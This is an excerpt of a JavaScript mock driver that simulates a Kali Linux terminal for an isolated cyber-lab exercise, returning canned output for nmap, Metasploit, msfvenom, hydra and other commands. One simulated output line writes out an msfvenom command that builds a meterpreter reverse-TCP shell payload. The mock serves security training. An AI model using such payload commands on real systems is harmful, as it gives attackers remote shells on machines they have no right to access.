    ...
    async executeCommand(session, rawCommand) {
        ...
        if (cmd.startsWith('cat ')) {
            ...
            if (target === 'targets.txt') {
                return {
                    stdout: '# Cyber Lab Isolated Lab Network Targets\n' +
            ...
            if (target === '/etc/os-release' || target === '/etc/issue') {
                return {
                    stdout: 'PRETTY_NAME="Kali GNU/Linux Rolling"\n' +
                        'NAME="Kali GNU/Linux"\n' +
                        'VERSION_ID="2024.1"\n' +
                        'VERSION="2024.1"\n' +
                        'ID=kali\n' +
        ...
        if (cmd.startsWith('apt')) {
            if (cmd.includes('update')) {
                return {
                    stdout: 'Get:1 http://http.kali.org/kali kali-rolling InRelease [41.5 kB]\n' +
        ...
        if (cmd.startsWith('nmap')) {
            return {
                stdout: 'Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-16 12:00 UTC\n' +
        ...
        if (cmd.startsWith('msfconsole')) {
            return {
                stdout: 'Metasploit Framework v6.4.12-dev\n' +
        ...
        if (cmd.startsWith('msfvenom')) {
            return {
                stdout: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.0.2 LPORT=4444 -f elf > shell.elf\n' +
        ...
        if (cmd.startsWith('hydra')) {
            return {
                stdout: 'Hydra v9.5 (c) 2023 by van Hauser / THC\n' +
...
exports.DevMockDriver = DevMockDriver;
